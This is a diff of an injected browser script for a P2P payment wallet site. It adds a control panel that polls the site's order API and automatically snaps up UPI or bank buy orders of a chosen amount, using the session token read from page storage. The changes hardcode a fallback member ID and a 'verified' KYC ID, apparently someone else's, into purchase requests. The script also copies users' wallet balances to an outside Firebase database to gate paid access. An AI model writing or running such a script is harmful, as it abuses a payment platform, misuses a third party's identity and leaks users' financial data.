@@ -1,3 +1,5 @@
+
+javascript
 (async function () {
   const v = document.createElement("style");
   v.innerHTML = `
@@ -9,7 +11,6 @@
         z-index: 999999;
         background: #f0ebe4;
         border-radius: 22px;
-        /* উন্নত ও দৃষ্টিনন্দন ফ্লোটিং স্যাডো (Floating Shadow) */
         box-shadow: 
             0 20px 45px rgba(0, 0, 0, 0.25),
             0 8px 16px rgba(0, 0, 0, 0.15),
@@ -22,7 +23,6 @@
         transition: box-shadow 0.3s ease, transform 0.3s ease;
     }
 
-    /* প্যানেলের ওপর কার্সার আনলে হালকা ড্রপ স্যাডো বাউন্স ইফেক্ট */
     #cyberPanel:hover {
         box-shadow: 
             0 25px 50px rgba(0, 0, 0, 0.3),
@@ -84,7 +84,6 @@
         letter-spacing: 0.5px;
     }
 
-    /* Toggle Buttons */
     .toggle-container {
         display: grid;
         grid-template-columns: 1.2fr 1fr;
@@ -112,7 +111,6 @@
             0 4px 10px rgba(80, 151, 150, 0.4);
     }
 
-    /* Input Field */
     .cyber-input {
         width: 100%;
         box-sizing: border-box;
@@ -134,7 +132,6 @@
         outline: none;
     }
 
-    /* Action Buttons */
     .cyber-buttons {
         display: grid;
         grid-template-columns: 1fr 1fr;
@@ -179,7 +176,6 @@
         transform: translateY(-1px);
     }
 
-    /* Status Indicator */
     .cyber-status {
         margin-top: 2px;
         background: #ded7cd;
@@ -240,6 +236,7 @@
     document.body.appendChild(v2);
   }
   const v3 = document.getElementById("overlay-live-status");
+
   let v4 = document.getElementById("cyberPanel");
   if (!v4) {
     v4 = document.createElement("div");
@@ -282,6 +279,7 @@
         </div>`;
     document.body.appendChild(v4);
   }
+
   const v5 = document.getElementById("cyberStatus");
   const v6 = document.getElementById("startBtn");
   const v7 = document.getElementById("stopBtn");
@@ -357,11 +355,14 @@
   }
 
   let v17 = null;
+  let currentMemberId = "";
+
   try {
     const v18 = await f8();
     const v19 = v18.allowed;
     v11 = v18.isPremium;
     f7();
+
     if (!v19) {
       f("Access denied");
       return;
@@ -401,9 +402,13 @@
         v17 = v20;
       }
     }
+
     if (!v17 && window.token?.value) {
       v17 = window.token.value;
     }
+
+    const userInfo = JSON.parse(localStorage.getItem("userInfo") || "{}");
+    currentMemberId = userInfo?.value?.memberId || userInfo?.value?.memberld || userInfo?.memberId || "22801760";
   } catch (e) {
     console.log(e);
   }
@@ -416,6 +421,7 @@
   const v21 = localStorage.getItem("arb_device_code") || crypto.randomUUID().replace(/-/g, "");
   localStorage.setItem("arb_device_code", v21);
 
+  // Updated Headers with Language and MemberId
   const vO = {
     accept: "application/json, text/plain, */*",
     "content-type": "application/json",
@@ -423,6 +429,8 @@
     deviceId: "undefined",
     deviceType: "3",
     page: "Arb",
+    language: "1",
+    memberId: String(currentMemberId),
     deviceCode: v21
   };
 
@@ -483,6 +491,7 @@
       try {
         const v24 = p11 === 1 ? "UPI" : "BANK";
         f("Checking " + v24 + " orders for ₹" + p10 + "...");
+
         const v25 = await fetch("https://apiweb.apiarbpay.com/ar-wallet/buyCenter/buyList", {
           method: "POST",
           headers: vO,
@@ -491,55 +500,71 @@
             pageNo: 1
           })
         });
+
         const v26 = await v25.json();
         const v27 = v26?.data?.list || [];
+
         if (!v27.length) {
           f("No orders found...");
           await f3(300);
           continue;
         }
-        const v28 = v27.filter(p12 => Number(p12.amount) === p10);
+
+        // Support exact amount or range matching
+        const v28 = v27.filter(p12 => {
+          const itemAmt = Number(p12.amount || p12.maxAmount || 0);
+          const minAmt = Number(p12.minAmount || p12.amount || 0);
+          return itemAmt === p10 || (p10 >= minAmt && p10 <= itemAmt);
+        });
+
         if (!v28.length) {
           f("Waiting for order ₹" + p10);
           await f3(300);
           continue;
         }
+
         for (const v29 of v28) {
           if (!v10) {
             break;
           }
-          f("Trying ₹" + v29.amount);
+          f("Trying ₹" + (v29.amount || p10));
+
           const vO2 = {
-            amount: v29.amount,
+            amount: v29.amount || p10,
             platformOrder: v29.platformOrder,
             payType: v29.payType,
             orderType: v29.orderType
           };
+
           try {
             const v30 = await fetch("https://apiweb.apiarbpay.com/ar-wallet/buyCenter/beforeBuy", {
               method: "POST",
               headers: vO,
               body: JSON.stringify(vO2)
             });
+
             const v31 = await v30.json();
             if (v31.code !== "1") {
               continue;
             }
+
+            // Updated with Verified MoneyView KYC ID: 5265767
             const v32 = await fetch("https://apiweb.apiarbpay.com/ar-wallet/buyCenter/buy", {
               method: "POST",
               headers: vO,
               body: JSON.stringify({
-                amount: v29.amount,
+                amount: v29.amount || p10,
                 platformOrder: v29.platformOrder,
                 payType: v29.payType,
                 orderType: v29.orderType,
                 buyBankCode: "moneyView",
-                buyerKycId: ""
+                buyerKycId: "5265767"
               })
             });
+
             const v33 = await v32.json();
             if (v33.code === "1" || v33.msg === "Success") {
-              f("SUCCESS ₹" + v29.amount);
+              f("SUCCESS ₹" + (v29.amount || p10));
               location.reload();
               return;
             }
@@ -561,23 +586,31 @@
       const v34 = JSON.parse(localStorage.getItem("userInfo"));
       const v35 = v34?.value?.memberId || v34?.value?.memberld;
       const v36 = v34?.balance ?? v34?.value?.balance;
+
       if (!v35 || v36 === undefined || v36 === null) {
         return;
       }
+
       const v37 = firebase.firestore();
       const v38 = await v37.collection("members").where("walletUserId", "==", String(v35)).limit(1).get();
+
       if (v38.empty) {
         return;
       }
+
       const v39 = v38.docs[0];
       const v40 = v37.collection("members").doc(v39.id);
       const v41 = v39.data();
+
       const vNumber3 = Number(v41.balance ?? 0);
       const vNumber4 = Number(v36);
+
       if (vNumber3 === vNumber4) {
         return;
       }
+
       const v42 = vNumber4 - vNumber3;
+
       await v37.collection("transactions").add({
         walletUserId: String(v35),
         previousBalance: vNumber3,
@@ -586,6 +619,7 @@
         type: v42 > 0 ? "credit" : "debit",
         createdAt: firebase.firestore.FieldValue.serverTimestamp()
       });
+
       await v40.update({
         balance: vNumber4,
         balanceUpdatedAt: firebase.firestore.FieldValue.serverTimestamp()
@@ -607,19 +641,23 @@
     try {
       const v43 = JSON.parse(localStorage.getItem("userInfo"));
       const v44 = v43?.value?.memberId || v43?.value?.memberld;
+
       if (!v44) {
         return {
           allowed: false,
           isPremium: false
         };
       }
+
       const v45 = await firebase.firestore().collection("members").where("walletUserId", "==", String(v44)).where("active", "==", true).limit(1).get();
+
       if (v45.empty) {
         return {
           allowed: false,
           isPremium: false
         };
       }
+
       const v46 = v45.docs[0].data();
       return {
         allowed: true,
@@ -633,4 +671,3 @@
     }
   }
 })();
-            
